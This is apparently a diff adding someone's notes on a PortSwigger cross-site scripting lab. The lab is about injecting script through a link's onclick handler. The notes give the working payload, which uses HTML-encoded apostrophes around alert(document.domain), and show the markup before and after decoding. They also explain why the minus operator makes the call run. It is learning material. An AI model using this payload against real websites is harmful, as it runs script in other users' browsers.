@@ -1,0 +1,21 @@
+<> " html encoded
+' \ escaped
+Website is what is used in the onClick text
+ <a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">Test</a>
+ this is what the onclick function does
+ https://portswigger.net/web-security/cross-site-scripting/contexts
+ Making use of HTML-encoding
+ &apos;-alert(document.domain)-&apos;
+ http:// &apos;-alert(document.domain)-&apos; 
+ is used as the payload
+ SOLVED
+<a id="author" href="http://&apos;-alert(document.domain)-&apos;" onclick="var tracker={track(){}};tracker.track('http://&apos;-alert(document.domain)-&apos;');">test</a>
+is what is looks like after injection
+
+This is what it looks like HTML decoded
+  <a id="author" href="http://'-alert(document.domain)-'" onclick="var tracker={track(){}};tracker.track('http://'-alert(document.domain)-'');">test</a>
+
+The - is used to try to subtract the values instead a NaN is created since it is not a number 
+when the function is tried to be used to subtract it is undefined as it a function and simply triggers the function
+Thats why the - is import
+
